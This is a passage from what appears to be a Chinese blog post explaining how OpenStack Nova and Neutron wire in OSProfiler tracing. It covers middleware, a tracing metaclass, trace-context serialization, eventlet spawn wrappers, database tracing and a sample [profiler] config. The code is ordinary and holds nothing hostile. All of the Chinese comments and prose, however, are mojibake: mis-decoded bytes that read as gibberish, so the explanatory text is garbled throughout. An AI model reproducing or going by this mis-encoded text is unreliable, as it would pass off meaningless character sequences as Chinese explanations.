@classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">factory</span>(<span class="params">cls, global_conf, **local_conf</span>):</span></span><br><span class="line">        <span class="keyword">if</span> profiler_web:    <span class="comment"># è°ƒç”¨ osprofiler</span></span><br><span class="line">            <span class="keyword">return</span> profiler_web.WsgiMiddleware.factory(global_conf,</span><br><span class="line">                                                       **local_conf)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">filter_</span>(<span class="params">app</span>):</span></span><br><span class="line">            <span class="keyword">return</span> cls(app, **local_conf)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> filter_</span><br><span class="line"></span><br><span class="line"><span class="meta">    @webob.dec.wsgify</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        <span class="keyword">return</span> request.get_response(self.application)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å…ƒæ•°æ®</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_traced_meta</span>():</span></span><br><span class="line">    <span class="keyword">if</span> profiler <span class="keyword">and</span> <span class="string">&#x27;profiler&#x27;</span> <span class="keyword">in</span> CONF <span class="keyword">and</span> CONF.profiler.enabled:</span><br><span class="line">        <span class="keyword">return</span> profiler.TracedMeta</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># NOTE(rpodolyaka): if we do not return a child of type, then Python</span></span><br><span class="line">        <span class="comment"># fails to build a correct MRO when osprofiler is not installed</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">NoopMeta</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> NoopMeta</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒ…è£… osprofiler ç±»è£…é¥°å™¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trace_cls</span>(<span class="params">name, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Wrap the OSProfiler trace_cls decorator so that it will not try to</span></span><br><span class="line"><span class="string">    patch the class unless OSProfiler is present and enabled in the config</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param name: The name of action. E.g. wsgi, rpc, db, etc..</span></span><br><span class="line"><span class="string">    :param kwargs: Any other keyword args used by profiler.trace_cls</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="keyword">if</span> profiler <span class="keyword">and</span> <span class="string">&#x27;profiler&#x27;</span> <span class="keyword">in</span> CONF <span class="keyword">and</span> CONF.profiler.enabled:</span><br><span class="line">            trace_decorator = profiler.trace_cls(name, kwargs)</span><br><span class="line">            <span class="keyword">return</span> trace_decorator(cls)</span><br><span class="line">        <span class="keyword">return</span> cls</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure><p><code>nova/manager.py</code> ä½¿ç”¨å…ƒç±»å®ç°ç±»æ”¯æŒè¿½è¸ªï¼Œnova ç»„ä»¶å†…éƒ¨çš„æ¨¡å—éƒ½ç»§æ‰¿è¯¥ç±»ï¼ˆ<code>ComputeManager</code>ã€<code>ConductorManager</code>ã€<code>SchedulerManager</code>ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…ƒç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ManagerMeta</span>(<span class="params">profiler.get_traced_meta(<span class="params"></span>), <span class="built_in">type</span>(<span class="params">PeriodicTasks</span>)</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Metaclass to trace all children of a specific class.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This metaclass wraps every public method (not starting with _ or __)</span></span><br><span class="line"><span class="string">    of the class using it. All children classes of the class using ManagerMeta</span></span><br><span class="line"><span class="string">    will be profiled as well.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Adding this metaclass requires that the __trace_args__ attribute be added</span></span><br><span class="line"><span class="string">    to the class we want to modify. That attribute is a dictionary</span></span><br><span class="line"><span class="string">    with one mandatory key: &quot;name&quot;. &quot;name&quot; defines the name</span></span><br><span class="line"><span class="string">    of the action to be traced (for example, wsgi, rpc, db).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The OSprofiler-based tracing, although, will only happen if profiler</span></span><br><span class="line"><span class="string">    instance was initiated somewhere before in the thread, that can only happen</span></span><br><span class="line"><span class="string">    if profiling is enabled in nova.conf and the API call to Nova API contained</span></span><br><span class="line"><span class="string">    specific headers.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»§æ‰¿</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span>(<span class="params">base.Base, PeriodicTasks, metaclass=ManagerMeta</span>):</span></span><br><span class="line">    __trace_args__ = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;rpc&quot;</span>&#125;    <span class="comment"># å¿…é¡»</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>nova/rpc.py</code> å®ç°è¿½è¸ªä¸Šä¸‹æ–‡çš„åºåˆ—åŒ–ï¼ˆå¹¶æ›´æ–°ä¸Šä¸‹æ–‡ï¼‰å’Œååºåˆ—åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfilerRequestContextSerializer</span>(<span class="params">RequestContextSerializer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        _context = <span class="built_in">super</span>(ProfilerRequestContextSerializer,</span><br><span class="line">                         self).serialize_context(context)</span><br><span class="line"></span><br><span class="line">        prof = profiler.get()       <span class="comment"># è·å– osprofiler å®ä¾‹</span></span><br><span class="line">        <span class="keyword">if</span> prof:</span><br><span class="line">            <span class="comment"># FIXME(DinaBelova): we&#x27;ll add profiler.get_info() method</span></span><br><span class="line">            <span class="comment"># to extract this info -&gt; we&#x27;ll need to update these lines</span></span><br><span class="line">            trace_info = &#123;</span><br><span class="line">                <span class="string">&quot;hmac_key&quot;</span>: prof.hmac_key,</span><br><span class="line">                <span class="string">&quot;base_id&quot;</span>: prof.get_base_id(),</span><br><span class="line">                <span class="string">&quot;parent_id&quot;</span>: prof.get_id()</span><br><span class="line">            &#125;</span><br><span class="line">            _context.update(&#123;<span class="string">&quot;trace_info&quot;</span>: trace_info&#125;) <span class="comment"># æ·»åŠ è¿½è¸ªä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> _context</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        trace_info = context.pop(<span class="string">&quot;trace_info&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> trace_info:</span><br><span class="line">            profiler.init(**trace_info)     <span class="comment"># åˆå§‹æ–°çš„åŒ– osprofiler å®ä¾‹</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>(ProfilerRequestContextSerializer,</span><br><span class="line">                     self).deserialize_context(context)</span><br></pre></td></tr></table></figure><p><code>nova/utils.py</code> å®ç° spawn å’Œ spawn_n è£…é¥°å™¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿”å›è¿½è¸ªä¿¡æ¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_serialize_profile_info</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> profiler:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    prof = profiler.get()   <span class="comment"># è·å–å®ä¾‹</span></span><br><span class="line">    trace_info = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> prof:</span><br><span class="line">        <span class="comment"># FIXME(DinaBelova): we&#x27;ll add profiler.get_info() method</span></span><br><span class="line">        <span class="comment"># to extract this info -&gt; we&#x27;ll need to update these lines</span></span><br><span class="line">        trace_info = &#123;</span><br><span class="line">            <span class="string">&quot;hmac_key&quot;</span>: prof.hmac_key,</span><br><span class="line">            <span class="string">&quot;base_id&quot;</span>: prof.get_base_id(),</span><br><span class="line">            <span class="string">&quot;parent_id&quot;</span>: prof.get_id()</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> trace_info</span><br><span class="line"></span><br><span class="line"><span class="comment"># è£…é¥°å™¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spawn</span>(<span class="params">func, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Passthrough method for eventlet.spawn.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This utility exists so that it can be stubbed for testing without</span></span><br><span class="line"><span class="string">    interfering with the service spawns.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    It will also grab the context from the threadlocal store and add it to</span></span><br><span class="line"><span class="string">    the store on the new thread.  This allows for continuity in logging the</span></span><br><span class="line"><span class="string">    context when using this method to spawn a new thread.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    _context = common_context.get_current()     <span class="comment"># å½“å‰çº¿ç¨‹</span></span><br><span class="line">    profiler_info = _serialize_profile_info()   <span class="comment"># è¿½è¸ªä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">context_wrapper</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="comment"># <span class="doctag">NOTE:</span> If update_store is not called after spawn it won&#x27;t be</span></span><br><span class="line">        <span class="comment"># available for the logger to pull from threadlocal storage.</span></span><br><span class="line">        <span class="keyword">if</span> _context <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            _context.update_store()</span><br><span class="line">        <span class="keyword">if</span> profiler_info <span class="keyword">and</span> profiler:</span><br><span class="line">            profiler.init(**profiler_info)      <span class="comment"># åˆå§‹åŒ– osprofiler å®ä¾‹</span></span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eventlet.spawn(context_wrapper, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è£…é¥°å™¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spawn_n</span>(<span class="params">func, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Passthrough method for eventlet.spawn_n.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This utility exists so that it can be stubbed for testing without</span></span><br><span class="line"><span class="string">    interfering with the service spawns.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    It will also grab the context from the threadlocal store and add it to</span></span><br><span class="line"><span class="string">    the store on the new thread.  This allows for continuity in logging the</span></span><br><span class="line"><span class="string">    context when using this method to spawn a new thread.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    _context = common_context.get_current()</span><br><span class="line">    profiler_info = _serialize_profile_info()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">context_wrapper</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="comment"># <span class="doctag">NOTE:</span> If update_store is not called after spawn_n it won&#x27;t be</span></span><br><span class="line">        <span class="comment"># available for the logger to pull from threadlocal storage.</span></span><br><span class="line">        <span class="keyword">if</span> _context <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            _context.update_store()</span><br><span class="line">        <span class="keyword">if</span> profiler_info <span class="keyword">and</span> profiler:</span><br><span class="line">            profiler.init(**profiler_info)</span><br><span class="line">        func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    eventlet.spawn_n(context_wrapper, *args, **kwargs)</span><br></pre></td></tr></table></figure><p><code>nova/db/sqlalchemy/api.py</code> æ·»åŠ æ•°æ®åº“è¿½è¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿½è¸ªæ•°æ®åº“è°ƒç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure</span>(<span class="params">conf</span>):</span></span><br><span class="line">    main_context_manager.configure(**_get_db_conf(conf.database))</span><br><span class="line">    api_context_manager.configure(**_get_db_conf(conf.api_database))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> profiler_sqlalchemy <span class="keyword">and</span> CONF.profiler.enabled \</span><br><span class="line">            <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line"></span><br><span class="line">        main_context_manager.append_on_engine_create(</span><br><span class="line">            <span class="keyword">lambda</span> eng: profiler_sqlalchemy.add_tracing(sa, eng, <span class="string">&quot;db&quot;</span>))     <span class="comment"># æ·»åŠ è¿½è¸ª</span></span><br><span class="line">        api_context_manager.append_on_engine_create(</span><br><span class="line">            <span class="keyword">lambda</span> eng: profiler_sqlalchemy.add_tracing(sa, eng, <span class="string">&quot;db&quot;</span>))     <span class="comment"># æ·»åŠ è¿½è¸ª</span></span><br></pre></td></tr></table></figure><h2 id="Neutron"><a href="#Neutron" class="headerlink" title="Neutron"></a>Neutron</h2><p>ç›¸å…³æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">neutron/manager.py          <span class="comment"># å…ƒç±»</span></span><br><span class="line">neutron/common/profiler.py  <span class="comment"># æ ¹æ®é…ç½®æ–‡ä»¶è®¾ç½®é©±åŠ¨ï¼Œå¯ç”¨ WSGI ä¸­é—´ä»¶</span></span><br><span class="line">neutron/common/utils.py     <span class="comment"># spawn/spawn_n è£…é¥°å™¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨ neutron/common/profiler.py è®¾ç½® OSProfiler</span></span><br><span class="line">neutron/service.py</span><br><span class="line">neutron/server/__init__.py</span><br><span class="line">neutron/plugins/ml2/drivers/openvswitch/agent/main.py</span><br><span class="line">neutron/plugins/ml2/drivers/linuxbridge/agent/linuxbridge_neutron_agent.py</span><br><span class="line">neutron/plugins/ml2/drivers/mec_sriov/agent/sriov_nic_agent.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨ç±»è£…é¥°å™¨ @profiler.trace_cls(&quot;&quot;)</span></span><br><span class="line">neutron/agent/l3/agent.py   <span class="comment"># l3-agent</span></span><br><span class="line">neutron/plugins/ml2/drivers/openvswitch/agent/ovs_dvr_neutron_agent.py  <span class="comment"># ovs_dvr_agent</span></span><br><span class="line">neutron/plugins/ml2/drivers/agent/_common_agent.py  <span class="comment"># rpc</span></span><br><span class="line">neutron/plugins/ml2/drivers/mec_sriov/agent/sriov_nic_agent.py  <span class="comment"># rpc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨å‡½æ•°è£…é¥°å™¨ @profiler.trace(&quot;&quot;)</span></span><br><span class="line">neutron/plugins/ml2/drivers/openvswitch/agent/ovs_neutron_agent.py  <span class="comment"># rpc</span></span><br><span class="line">neutron/plugins/ml2/rpc.py  <span class="comment"># rpc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cProfile</span></span><br><span class="line">conf/profiling.py</span><br><span class="line">neutron/profiling/profiled_decorator.py</span><br></pre></td></tr></table></figure><p><code>neutron/manager.py</code> å’Œ Nova åŒæ ·çš„å®ç°æ€è·¯ï¼Œä½¿ç”¨å…ƒç±»å®ç°ç±»è¿½è¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…ƒç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ManagerMeta</span>(<span class="params">profiler.TracedMeta, <span class="built_in">type</span>(<span class="params">periodic_task.PeriodicTasks</span>)</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»§æ‰¿</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span>(<span class="params">periodic_task.PeriodicTasks, metaclass=ManagerMeta</span>):</span></span><br><span class="line">    __trace_args__ = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;rpc&quot;</span>&#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>neutron/common/profiler.py</code> å¯ç”¨ OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>(<span class="params">name, host=<span class="string">&#x27;0.0.0.0&#x27;</span></span>):</span>  <span class="comment"># nosec</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Setup OSprofiler notifier and enable profiling.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param name: name of the service, that will be profiled</span></span><br><span class="line"><span class="string">    :param host: host (either host name or host address) the service will be</span></span><br><span class="line"><span class="string">                 running on. By default host will be set to 0.0.0.0, but more</span></span><br><span class="line"><span class="string">                 specified host name / address usage is highly recommended.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler.initializer.init_from_conf(      <span class="comment"># å¯ç”¨ OSProfiler</span></span><br><span class="line">            conf=CONF,</span><br><span class="line">            context=context.get_admin_context().to_dict(),</span><br><span class="line">            project=<span class="string">&quot;neutron&quot;</span>,</span><br><span class="line">            service=name,</span><br><span class="line">            host=host</span><br><span class="line">        )</span><br><span class="line">        LOG.info(<span class="string">&quot;OSProfiler is enabled.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Traces provided from the profiler &quot;</span></span><br><span class="line">                 <span class="string">&quot;can only be subscribed to using the same HMAC keys that &quot;</span></span><br><span class="line">                 <span class="string">&quot;are configured in Neutron&#x27;s configuration file &quot;</span></span><br><span class="line">                 <span class="string">&quot;under the [profiler] section.\n To disable OSprofiler &quot;</span></span><br><span class="line">                 <span class="string">&quot;set in /etc/neutron/neutron.conf:\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;[profiler]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;enabled=false&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>neutron/common/utils.py</code> è¿”å›è¿½è¸ªä¿¡æ¯ï¼Œå®ç° spawn å’Œ spawn_n è£…é¥°å™¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿”å›è¿½è¸ªä¿¡æ¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collect_profiler_info</span>():</span></span><br><span class="line">    p = profiler.get()</span><br><span class="line">    <span class="keyword">if</span> p:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;hmac_key&quot;</span>: p.hmac_key,</span><br><span class="line">            <span class="string">&quot;base_id&quot;</span>: p.get_base_id(),</span><br><span class="line">            <span class="string">&quot;parent_id&quot;</span>: p.get_id(),</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è£…é¥°å™¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spawn</span>(<span class="params">func, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;As eventlet.spawn() but with osprofiler initialized in the new threads</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    osprofiler stores the profiler instance in thread local storage, therefore</span></span><br><span class="line"><span class="string">    in new threads (including eventlet threads) osprofiler comes uninitialized</span></span><br><span class="line"><span class="string">    by default. This spawn() is a stand-in replacement for eventlet.spawn()</span></span><br><span class="line"><span class="string">    but we re-initialize osprofiler in threads spawn()-ed.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    profiler_info = collect_profiler_info()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> profiler_info:</span><br><span class="line">            profiler.init(**profiler_info)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eventlet.spawn(wrapper, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è£…é¥°å™¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spawn_n</span>(<span class="params">func, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;See spawn() above&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    profiler_info = collect_profiler_info()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> profiler_info:</span><br><span class="line">            profiler.init(**profiler_info)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eventlet.spawn_n(wrapper, *args, **kwargs)</span><br></pre></td></tr></table></figure><p><code>neutron/server/__init__.py</code> å¯ç”¨ OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_application</span>():</span></span><br><span class="line">    _init_configuration()</span><br><span class="line">    profiler.setup(<span class="string">&#x27;neutron-server&#x27;</span>, cfg.CONF.host)     <span class="comment"># å¯ç”¨ OSProfiler</span></span><br><span class="line">    <span class="keyword">return</span> config.load_paste_app(<span class="string">&#x27;neutron&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="OSProfiler-ä½¿ç”¨"><a href="#OSProfiler-ä½¿ç”¨" class="headerlink" title="OSProfiler ä½¿ç”¨"></a>OSProfiler ä½¿ç”¨</h1><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>åœ¨ <a href="https://jckling.github.io/2020/12/25/OpenStack/CentOS7+OpenStack(Rocky)-0/">CentOS 7 å®‰è£… Openstack Rocky ç‰ˆæœ¬ - ç¯å¢ƒæ­å»º</a> ä¸€ç³»åˆ—æ–‡ç« çš„åŸºç¡€ä¸Šè¿›è¡Œå®éªŒï¼Œæ•´ä½“æ¶æ„å¦‚ä¸‹ï¼š</p><img src="https://i.loli.net/2021/06/06/R5mAHUtLlM1eyhb.jpg"><p>ä¿®æ”¹æ§åˆ¶èŠ‚ç‚¹ä¸Šç›¸å…³ç»„ä»¶çš„é…ç½®æ–‡ä»¶ï¼Œå¯ç”¨ OSProfiler </p><p>Controller</p><ul><li>Keystone</li><li>Glance</li><li>Nova*</li><li>Neutron*</li><li>Cinder</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[profiler]</span><br><span class="line">enabled &#x3D; True</span><br><span class="line"></span><br><span class="line">trace_sqlalchemy &#x3D; True</span><br><span class="line">trace_wsgi_transport  &#x3D; True</span><br><span class="line">trace_message_store  &#x3D; True</span><br><span class="line">trace_management_store  &#x3D; True</span><br><span class="line"></span><br><span class="line">hmac_keys &#x3D; 123</span><br><span class="line"></span><br><span class="line">connection_string &#x3D; mongodb:&#x2F;&#x2F;10.112.116.249:27017</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ MongoDB 